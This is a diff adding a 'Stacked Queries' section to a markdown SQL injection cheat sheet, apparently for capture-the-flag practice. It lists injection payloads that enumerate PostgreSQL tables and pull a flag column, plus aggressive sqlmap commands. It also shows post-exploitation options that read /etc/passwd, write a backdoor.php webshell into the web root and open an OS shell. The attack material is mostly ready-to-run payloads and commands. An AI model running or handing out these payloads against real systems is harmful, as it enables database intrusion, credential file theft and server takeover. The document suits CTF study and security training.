@@ -525,8 +525,121 @@ Enumerate columns in a specific table
 
 ```sql
 ')) UNION ALL SELECT 1, flag, '', 1 FROM app.targetTable -- -
+``` 
+
+### Stacked Queries
+
+How Stacked Queries Work
+
+Normally, SQL queries sent to a database are supposed to be single, complete commands.
+But if an application is vulnerable and does not properly sanitize input, an attacker might inject something like:
+
+; separates two queries.
+
+The first query runs and returns something.
+
+Then the second query executes and deletes the users table.
+
+
+### Optional
+if allowed
+
+```shell
+sqlmap -u "http://example.com/page.php?id=1" --level=5 --risk=3 --batch --dbs
+```
+
+It can test all types: error-based, boolean-based, time-based — and auto-detect the backend.
+
+show all tables
+
+```sql
+target';select * from pg_tables-- -
+```
+
+PostgreSQL stores all table metadata in the pg_tables system view.
+
+```sql
+target; SELECT tablename FROM pg_tables WHERE schemaname='public'; --
+```
+
+Once you've identified a suspicious table (e.g., table), inspect its columns with:
+
+```sql
+target; SELECT column_name FROM information_schema.columns WHERE table_name='table'; --
+```
+
+Now that you know the table and the column, extract the data with a final stacked query:
+
+```sql
+target; SELECT flag FROM flag_table; --
 ```
 
 ```sql
-
+target; SELECT flag FROM flag_table; --
 ```
+
+### SQLMAP
+
+```shell
+sqlmap -u "http://sql-injection/exploit/stacked" --technique=S --dbms=PostgreSQL --risk=3 --level=5 --batch
+```
+
+##### Breakdown of the Options
+
+Option	Purpose
+--
+-u	Target URL
+?id=rug	The vulnerable parameter id with test input rug
+--technique=S	Only use Stacked queries (S)
+--dbms=PostgreSQL	Assume backend is PostgreSQL (helps optimize payloads)
+--risk=3 --level=5	Enables more aggressive payloads and parameter coverage
+--batch	Auto-confirms prompts for non-interactive use
+--time-sec=5 → helps detect time-based blind SQLi (e.g., via pg_sleep)
+--flush-session → forces sqlmap to retry scanning from scratch
+--data="username=rug" Sends this as the POST body
+-r: tells sqlmap to read a raw HTTP request file
+
+By default, sqlmap tests all parameters (name, sort, order). If only one is vulnerable, you can narrow it down:
+
+-p name
+
+Some apps reject POST without Content-Type: application/x-www-form-urlencoded. Add it like so:
+
+--headers="Content-Type: application/x-www-form-urlencoded"
+
+Once sqlmap confirms a vulnerability, you can use:
+
+```shell
+sqlmap -u "http://target.url/?id=rug" --sql-shell
+```
+
+This gives you a live SQL shell — anything you type will be executed directly on the database. For example:
+
+Read files from disk:
+
+--file-read=/etc/passwd
+
+Write files (webshells, payloads):
+
+--file-write=backdoor.php --file-dest=/var/www/html/shell.php
+
+Execute OS commands:
+
+--os-shell
+
+#### Send to sqlmap (optional)
+
+```shell
+sqlmap -r burp_request.txt --batch --risk=3 --level=5 --technique=S
+```
+
+
+### URL-Encoded
+
+;	                %3B
+space ( )	        %20
+' (single quote)	%27
+=	                %3D
+-- (comment) 	    -- or --+
+
+
